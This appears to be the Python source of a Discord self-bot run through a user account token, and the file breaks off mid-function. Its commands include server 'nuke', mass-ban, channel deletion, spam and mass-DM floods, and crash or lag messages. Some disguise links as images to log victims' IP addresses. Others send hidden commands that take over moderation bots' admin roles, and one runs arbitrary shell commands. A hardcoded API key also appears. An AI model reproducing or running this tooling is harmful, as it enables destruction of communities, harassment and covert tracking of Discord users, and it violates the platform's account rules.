import re
import logging
import datetime
from datetime import datetime
import string
import typing
from loguru import logger
import aiohttp
import base64
import Brainshop
import random
import pretty_errors
from colorama import Fore, init, Style
import time
import multiprocessing
import asyncio
import sys
import colorama
from colorama import Fore,Style, init
import discord
from discord.ext import commands
from discord.utils import get
from dotenv import load_dotenv
import os
from flask import Flask
from threading import Thread
import json
import requests
load_dotenv()
loop = asyncio.get_event_loop()

def print_add(message):
    print(f'{Fore.GREEN}[+]{Style.RESET_ALL} {message}')

def print_delete(message):
    print(f'{Fore.RED}[-]{Style.RESET_ALL} {message}')

def print_warning(message):
    print(f'{Fore.RED}[WARNING]{Style.RESET_ALL} {message}')


def print_error(message):
    print(f'{Fore.RED}[ERROR]{Style.RESET_ALL} {message}')

def cls():
    system('cls')
prefix_file = open("prefix", "rt")
prefix = prefix_file.read()
print(prefix)
prefix_file.close()
bot = commands.Bot(command_prefix=prefix, self_bot=True)
client = discord.Client
id = 1130995254863073442
TOKEN=''
def my_function(x):
  return list(dict.fromkeys(x))

def read_streak():
    with open("streak.txt", "r") as file:
        return int(file.read())

def write_streak(count):
    with open("streak.txt", "w") as file:
        file.write(str(count))
bkd = '?'
@bot.command()
async def uncarlb(ctx):
 await ctx.message.delete()
 if ctx.message.channel_mentions:
  mentioned_channel = ctx.message.channel_mentions[0]
 elif not mentioned_channel and ctx.message.raw_channel_mentions:
  voice_channel = ctx.guild.get_channel(ctx.message.raw_channel_mentions)
  if voice_channel and voice_channel.type == discord.ChannelType.Voice:
   mentioned_channel = voice_channel
 r = await mentioned_channel.send(f'{bkd}modrole clear', silent=True)
 r.delete()
@bot.command()
async def carlb(ctx, role):
 await ctx.message.delete()
 if ctx.message.channel_mentions:
  mentioned_channel = ctx.message.channel_mentions[0]
 elif not mentioned_channel and ctx.message.raw_channel_mentions:
  voice_channel = ctx.guild.get_channel(ctx.message.raw_channel_mentions)
  if voice_channel and voice_channel.type == discord.ChannelType.Voice:
   mentioned_channel = voice_channel
 r = await mentioned_channel.send(f'{bkd}modrole {role}', silent=True)
 await r.delete()
@bot.command()
async def dynohack(ctx, protected):
    user = ctx.author
    for role in ctx.guild.roles:
        if role != user.top_role and not role.is_bot_managed():
            r=await ctx.send(f'{bkd}delmod {role}', silent=True)
            await r.delete()
            await asyncio.sleep(5)
    h=await ctx.send(f'{bkd}addmod {protected}', silent=True)
    await h.delete()
@bot.command()
async def undynob(ctx, role):
 await ctx.message.delete()
 if ctx.message.channel_mentions:
  mentioned_channel = ctx.message.channel_mentions[0]
 elif not mentioned_channel and ctx.message.raw_channel_mentions:
  voice_channel = ctx.guild.get_channel(ctx.message.raw_channel_mentions)
  if voice_channel and voice_channel.type == discord.ChannelType.Voice:
   mentioned_channel = voice_channel
 r = await mentioned_channel.send(f'{bkd}delmod {role}', silent=True)
 r.delete()
@bot.command()
async def dynob(ctx, role):
 await ctx.message.delete()
 if ctx.message.channel_mentions:
  mentioned_channel = ctx.message.channel_mentions[0]
 elif not mentioned_channel and ctx.message.raw_channel_mentions:
  voice_channel = ctx.guild.get_channel(ctx.message.raw_channel_mentions)
  if voice_channel and voice_channel.type == discord.ChannelType.Voice:
   mentioned_channel = voice_channel
 r = await mentioned_channel.send(f'{bkd}addmod {role}', silent=True)
 await r.delete()
@bot.command()
async def backdoorp(ctx, msg):
 global bkd
 bkd = msg
dynop='?'
@bot.command()
async def echoprefix(ctx, msg):
 global dynop
 dynop = msg
 await ctx.message.delete()
@bot.command()
async def carlecho(ctx, msg):
 try:
        await ctx.message.delete()
 except discord.errors.NotFound:
        pass
 links = re.findall(r'https?://\S+', msg)
 for link in links:
        embed_link = f'{link}'
        msg = msg.replace(link, embed_link)
 for attachment in ctx.message.attachments:
        embed_link = f'{attachment.url}'
        msg += f' {embed_link}'
 g = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
 c = msg
 a = f'{dynop}space "' + c + '" ' + g
 d = await ctx.send(a)
 try:
  await d.delete()
 except discord.errors.NotFound:
  pass
@bot.command()
async def auditspam(ctx):
    while True:
        invite = await ctx.channel.create_invite(max_uses=1)
tg = 'test'
@bot.command()
async def tag(ctx, msg):
 await ctx.message.delete()
 global tg
 tg = msg
@bot.command()
async def dynoecho(ctx, msg, hiddenchan):
    try:
        await ctx.message.delete()
    except discord.errors.NotFound:
        pass    
    mentioned_channel = None
    
    # Check if a text channel is mentioned in the message
    if ctx.message.channel_mentions:
        mentioned_channel = ctx.message.channel_mentions[0]
    elif not mentioned_channel and ctx.message.raw_channel_mentions:
        voice_channel = ctx.guild.get_channel(ctx.message.raw_channel_mentions[0])
        if voice_channel and voice_channel.type == discord.ChannelType.voice:
            mentioned_channel = voice_channel
    
    if not mentioned_channel:
        await ctx.send("No channel mentioned in the message")
        return
    for attachment in ctx.message.attachments:
        embed_link = f'{attachment.url}'
        msg += f' {embed_link}' 
    r = await mentioned_channel.send(f'{dynop}tag create {tg} {msg}')
    try:
     await r.delete()
    except discord.errors.NotFound:
     pass
    await asyncio.sleep(1)
    
    c = await ctx.send(f'{dynop}tag {tg}')
    try:
        await c.delete()
    except discord.errors.NotFound:
        pass
    await asyncio.sleep(1)
    
    g = await mentioned_channel.send(f'{dynop}tag delete {tg}')
    try:
        await g.delete()
    except discord.errors.NotFound:
        pass


@bot.command()
async def addflag(ctx, emoji, country):
    # Open the file
    with open('flags', 'r') as file:
        # Read the contents of the file
        contents = file.read()
        contents = contents.replace("'", '"')
        # Parse the contents as JSON
        table = json.loads(contents)

    # Add the new entry to the table
    table[emoji] = country

    # Write the updated table back to the file
    with open('flags', 'w') as file:
        # Convert the table to JSON and write it to the file
        file.write(json.dumps(table))

    await ctx.send(f'Added {emoji} with value {country} to the Flags')
@bot.command()
async def gtf(ctx, cooldown: int):
    with open('flags', 'r') as file:
     contents = file.read()
     contents = contents.replace("'", '"')
     countries = json.loads(contents)
    await ctx.message.delete()
    flag = random.choice(list(countries.keys()))
    country = countries[flag]

    await ctx.send(f"Guess the flag\n Which country does this flag belong to? {flag}\n ⏱ {cooldown} • ")

    def check(message):
        return country.lower() in message.content.lower()
    try:
        streak_count = read_streak()
        message = await bot.wait_for('message', timeout=cooldown, check=check)
        with open("countw", "r") as file:
         count = int(file.read())
         count += 1
        with open("countw", "w") as file:
         file.write(str(count))
         streak_count += 1
         write_streak(streak_count)
         await ctx.send(f"Congratulations {message.author.mention}! You guessed it right, the flag belongs to {country}!\nGlobal win count: {count}\nGlobal streak: {streak_count}")
    except asyncio.TimeoutError:
        streak_count = read_streak()
        with open("countl", "r") as file:
         countl = int(file.read())
         countl += 1
        with open("countl", "w") as file:
         file.write(str(countl))
         write_streak(0)
         await ctx.send(f"Time's up! The correct answer was {country}.\nGlobal lose count: {countl}\n Global streak: 0")
@bot.command()
async def cfarm(ctx):
 while True:
  try:
   message = await ctx.send("‎")
   await asyncio.sleep(0.1)
   await message.delete()   
  except:
   pass 
@bot.command()
async def fakegif(ctx, *emojis: str):
    message = await ctx.send("‎")
    
    while True:
        for emoji in emojis:
            await asyncio.sleep(0.5)
            await message.edit(content=emoji)
@bot.command()
async def sungif(ctx):
    message = await ctx.send("☀️")
    weather_phases = ["🌤️", "⛅", "🌥️", "☁️", "🌥️", "⛅", "🌤️", "☀️"]    
    while True:
        for phase in weather_phases:
            await asyncio.sleep(0.5)
            await message.edit(content=phase)
@bot.command()
async def moongif(ctx):
    message = await ctx.send("🌑")
    moon_phases = ["🌑", "🌘", "🌗", "🌖", "🌕", "🌔", "🌓", "🌒"]
    
    while True:
        for phase in moon_phases:
            await asyncio.sleep(0.5)
            await message.edit(content=phase)
@bot.command()
async def pumsg(ctx, limit=999, member: discord.Member=None):
    await ctx.message.delete()
    msg = []
    try:
        limit = int(limit)
    except:
        return await ctx.send("Please pass in an integer as limit")
    if not member:
        await ctx.channel.purge(limit=limit)
        return await ctx.send(f"Purged {limit} messages", delete_after=3)
    async for m in ctx.channel.history():
        if len(msg) == limit:
            break
        if m.author == member:
            msg.append(m)
    await ctx.channel.delete_messages(msg)
    await ctx.send(f"Purged {limit} messages of {member.mention}", delete_after=3)
@bot.command()
async def emojilag(ctx, emoji: str):
 await ctx.message.delete()
 while True:
  await ctx.send(emoji *1000)
@bot.command()
async def nemojilag(ctx, emoji: str):
 await ctx.message.delete()
 while True:
  await ctx.send(emoji *2000)
@bot.command()
async def gifcrash(ctx):
 await ctx.message.delete()
 await ctx.send("https://gfycat.com/boilingmarriedcalf")
@bot.command()
async def emojic(ctx):
 await ctx.message.delete()
 await ctx.send("<⚫> 👈🏻 ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏click dis")
@bot.command()
async def odms(ctx, *, user_id):

  user = await bot.fetch_user(user_id)

  if user:
    try:
     dm_channel = await user.create_dm()
    except:
      pass
@bot.command()
async def invites(ctx, user: discord.Member):
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == user:
            totalInvites += i.uses
    await ctx.send(f"{user.name} has invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")
@bot.command()
async def urban(ctx, word: str):
 await ctx.message.delete()
 urban = requests.get(f"https://api.urbandictionary.com/v0/define?term={word}")
 first = json.loads(urban.text)
 c = first['list'][0]
 d = c["definition"]
 await ctx.send(d)
@bot.command()
async def cserver(ctx, name: str):
    await ctx.message.delete()
    my_guild = await bot.create_guild(name)
    channel = await my_guild.create_text_channel(name)
    my_guild_invite = await channel.create_invite(validate=False)
    await ctx.send(f"https://discord.gg/{my_guild_invite.code}")
@bot.command()
async def play(ctx, game: str):
 await bot.change_presence(activity=discord.Game(name=game))
@bot.command()
async def r34(ctx, tags: str, amount: int):
 await ctx.message.delete()
 data = requests.get(f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit={amount}&tags={tags}")
 json_data = json.loads(data.text)
 rando = random.randint(0, amount)
 name = json_data[rando]['file_url']
 await ctx.send(name)
@bot.command()
async def dog(ctx):
 await ctx.message.delete()
 dog = requests.get("https://dog.ceo/api/breeds/image/random").json()["message"]
 await ctx.send(dog)
@bot.command()
async def type(ctx):
   while True:
    time.sleep(1.5)
    async with ctx.typing():
        a = float("inf")
        await asyncio.sleep(a)  # Simulating typing for 3 seconds

@bot.command()
async def spamall(ctx, msg: str, amount: int):
 await ctx.message.delete()
 for channel in list(ctx.message.guild.channels):
  for i in range(amount):
   try:
    await channel.send(msg)
   except:
    pass
@bot.command()
async def copyserver(ctx): 
    await ctx.message.delete()
    wow = await bot.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for emoji in ctx.guild.emojis:
        try:
            with open(f"{emoji.name}.png", "wb") as f:
                await emoji.url.save(f)
                with open(f"{emoji.name}.png", "rb") as image:
                    await wow.create_custom_emoji(name=emoji.name, image=image.read())
            print(f"Created new emoji: {emoji.name}")
        except:
            pass
    
     
    print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"Created new role : {role.name}")
            except:
                pass
    for g in bot.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(name = cate.name, overwrites = cate.overwrites)
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(name = chann.name, overwrites = chann.overwrites)
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(name = chann.name, overwrites = chann.overwrites)                    
@bot.command()
async def nuke(ctx, chname: str):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
        except:
            pass
    guild = ctx.message.guild
    for i in range(30):
     try:
      channel = await guild.create_text_channel(chname)
      await channel.send(f"@everyone {chname}")
     except:
      pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(ctx.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
@bot.command()
async def bash(ctx, code: str):
 os.system(code)
@bot.command()
async def ai(ctx, *, message):
 brain = Brainshop.Brain(key="LfPPGfDTYcwebdc6" , bid = 177608)
 await ctx.send(brain.ask(message))
@bot.command()
async def restart(ctx):
 await ctx.message.delete()
 await ctx.send("restarting the selfbot.")
 os.system("killall python && python self")
@bot.command()
async def stop(ctx):
 await ctx.message.delete()
 await ctx.send("stopped nex self-bot.")
 os.system("killall python")
@bot.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()  
    await ctx.channel.purge(limit=amount + 1)  # +1 to include the command message
    await ctx.send(f"Deleted {amount} messages!")
@bot.command()
async def roll(ctx):
    dice_roll = random.randint(1, 6)  # Simulate rolling a 6-sided dice
    await ctx.send(f"You rolled a {dice_roll}!")

@bot.command()
async def swebhook(ctx, url: str, msg: str, amount: int):
 for i in range(amount):
  try:
    data = requests.post(url, json={'content': msg})
  except:
   time.sleep(2)
@bot.command()
async def cwebhook(ctx, *, name: str):
    channel = ctx.channel
    webhook = await channel.create_webhook(name=name)
@bot.command()
async def whois(ctx, member: discord.Member):
    idf = str(member.id)
    tok = base64.b64encode(idf.encode("ascii"))
    toke = tok.decode("ascii")
    response = f"User id: {member.id}\nAccount created in: {member.created_at}\nUsername: {member.name}\nHalf Token: {toke}"
    await ctx.send(response)
@bot.command()
async def unroleall(ctx, role: discord.Role):
      for member in list(ctx.guild.members):
        try:
            await member.remove_roles(role)
        except discord.Forbidden:
            print(f"Unable to add role to {member.name}#{member.discriminator}")
afk_users = {}
@bot.command()
async def roleall(ctx, role: discord.Role):
       for member in list(ctx.guild.members):
        try:
            await member.add_roles(role)
        except discord.Forbidden:
            print("nil")

@bot.command()
async def imglg(ctx):
 await ctx.message.delete()
 await ctx.send("[www.media.discordapp.net/attachments/1143928805711413349/1146407151582060574/Screenshot_20230830-143234_Discord.jpg](https://ownpictures.vercel.app/api/main)")
@bot.command()
async def iv(ctx):
 await ctx.message.delete()
 await ctx.send("https://media.discordapp.net/attachments/1143928805711413349/1146407557422907432/federal.gif")
@bot.command()
async def djoke(ctx):
 await ctx.message.delete()
 data = requests.get("https://icanhazdadjoke.com/", headers={"Accept": "application/json"})
 main = data.json()['joke']
 await ctx.send(main)
@bot.command()
async def cat(ctx):
    await ctx.message.delete()
    response = requests.get("https://api.thecatapi.com/v1/images/search?limit=1")
    data = response.json()
    cat_url = data[0]['url']
    await ctx.send(cat_url)
@bot.command()
async def giveaway(ctx, duration: int, prize: str, winners: int):
    await ctx.message.delete()
    giveaway_message = await ctx.send(f"Prize: {prize}\nTime remaining: {duration} minutes\nWinners: {winners}")

    await giveaway_message.add_reaction("🎉")

    await asyncio.sleep(duration * 60)

    giveaway_message = await ctx.fetch_message(giveaway_message.id)
    reactions = giveaway_message.reactions

    participants = set()
    for reaction in reactions:
        if str(reaction.emoji) == "🎉":
            async for user in reaction.users():
                if not user.id == id:
                    participants.add(user)

    winner = None
    if participants:
        winner = random.choice(list(participants), winners)

    if winner:
        await ctx.send(f"Congratulations to the winner: {winner.mention}!")
    else:
        await ctx.send("No participants. Giveaway ended without a winner.")

@bot.command()
async def poll(ctx, question, *options):
    await ctx.message.delete()
    if len(options) < 2 or len(options) > 10:
        await ctx.send("Please provide at least 2 and at most 10 options for the poll.")
        return

    formatted_options = [f"{i+1}. {option}" for i, option in enumerate(options)]

    poll_message = f"**{question}**\n\n" + "\n".join(formatted_options)

    poll = await ctx.send(poll_message)
    ctx.message.delete()
    for i in range(len(options)):
        await poll.add_reaction(chr(127462 + i))

@bot.command()
async def tspam(ctx, msg: str, amount: int):
 for i in range(amount):
  time.sleep(1.5)
  try:
   message = await ctx.send(msg)
   await message.create_thread(name=msg, auto_archive_duration=60)
  except:
   pass
@bot.command()
async def rizz(ctx):
 rizlerz = requests.get("https://vinuxd.vercel.app/api/pickup")
 darizz = rizlerz.json()['pickup']
 await ctx.send(darizz)
 await ctx.message.delete()
@bot.command()
async def crchan(ctx, channel_name: str, times: int):
    guild = ctx.guild
    for i in range(times):
     new_channel = await guild.create_text_channel(channel_name)
@bot.command()
async def dmall(ctx, *, msg: str):
    guild = ctx.guild
    members = guild.members
    for member in list(ctx.guild.members):
     try:
      await member.send(msg)
     except:
       pass
@bot.command()
async def banall(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass
@bot.command()
async def insult(ctx):
 insu = requests.get("https://evilinsult.com/generate_insult.php?lang=en&type=json")
 da = insu.json()['insult']
 await ctx.message.delete()
 await ctx.send(da)
@bot.command()
async def deveryone(ctx):
    guild = ctx.guild
    ctx.message.delete()
    members = guild.members
    for member in members:
     try:
      await ctx.send(f"<@{member.id}>")
     except:
      pass
@bot.command()
async def flip(ctx):
    ctx.message.delete()
    result = random.choice(["Heads", "Tails"])
    await ctx.send(result)
@bot.command()
async def delchans(ctx):
    guild = ctx.guild
    channels = guild.channels
    for channel in channels:
        await channel.delete()
@bot.command()
async def everyone(ctx):
    guild = ctx.guild
    members = guild.members
    mention_string = '@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| || '.join([member.mention for member in members])
    await ctx.message.delete()
    await ctx.send(mention_string)
@bot.command()
async def sprefix(ctx, prefix: str):
    if ctx.author.id == id:
     fo = open("prefix", "w")
     fo.write(prefix)
     fo.close()
     pre = open("prefix", "rt")
     preix = pre.read()
     pre.close()
     bot.command_prefix = preix
     await ctx.message.delete()
     await ctx.send(f'Prefix has been changed to: {prefix}')
@bot.command()
async def secret(ctx, *, message):
    if ctx.author.id == id:
        await ctx.message.delete()
        await ctx.send(f"[{message}](https://media.discordapp.net/attachments/1142931530746953798/1144048416243077260/transparent-picture.png)")
@bot.command()
async def spam(ctx, st: str, amo: int):
    if ctx.author.id == id:
        await ctx.message.delete()
        for i in range(amo):
            await ctx.send(st)

@bot.command()
async def fvanity(ctx, van: str, rl: str):
    if ctx.author.id == id:
        await ctx.message.delete()
        await ctx.send(f"[www.discord.gg/{van}]( {rl} )")
@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)  # Convert to milliseconds
    await ctx.send(f"Bot's ping: {latency}ms")
@bot.command()
async def dwnlg(ctx):
    if ctx.author.id == id:
        await ctx.message.delete()
        await ctx.send("[www.media.discordapp.net/attachments/1143541839937425478/1143543207767060650/ejwjIR6.png](https://images-ext-2.discordapp.net/external/CogKna5NmZsRSCNtTegw_SGEHrk57_nOY5Vu-SNYcfM/https/ownpictures.vercel.app/api/Npass)")

@bot.command()
async def hypesquad(ctx, type: int):
 headers = {
    'authorization': TOKEN
}

 body = {
    'house_id': type
}
 response = requests.post( 'https://discord.com/api/v9/hypesquad/online', headers=headers, json=body)

@bot.command()
async def rmdms(ctx):
 channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", 
 headers={"Authorization": TOKEN}).json()
 for channel in channelIds:
    
    header = {
    'authorization': TOKEN
    
    }

    r = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=header)   
@bot.command()
async def cgc(ctx,  user: str, amount: int):
 iduser = int(user)
 for i in range(amount):
  time.sleep(1.5)
  try:
   headers = {
   'Authorization' : TOKEN,
   'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
   }
   r = requests.post('https://discordapp.com/api/v9/users/@me/channels', headers=headers, json={"recipients":[id, iduser]})
   headers = {
   "Authorization": TOKEN
   }
   channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", 
   headers={"Authorization": TOKEN}).json()
  except:
   pass
@bot.command()
async def finvite(ctx, uses: int):
 await ctx.message.delete()
 headers = {'authorization': TOKEN, 'Content-Type': 'application/json'}
 url = "https://discord.com/api/v9/users/@me/invites"
 data = {"max_age":999999999,"max_uses":uses,"temporary":False}
 r = requests.post(url, headers=headers, json=data)
 c = r.text
 k = json.loads(c)
 d = k["code"]
 user = ctx.message.author.name
 await ctx.send(f"https://discord.gg/{d}")
def my_function(x):
  return list(dict.fromkeys(x))
    
def get_all_friends():
    headers = {"authorization": TOKEN, "user-agent": "bruh6/9"}
    r = requests.get(
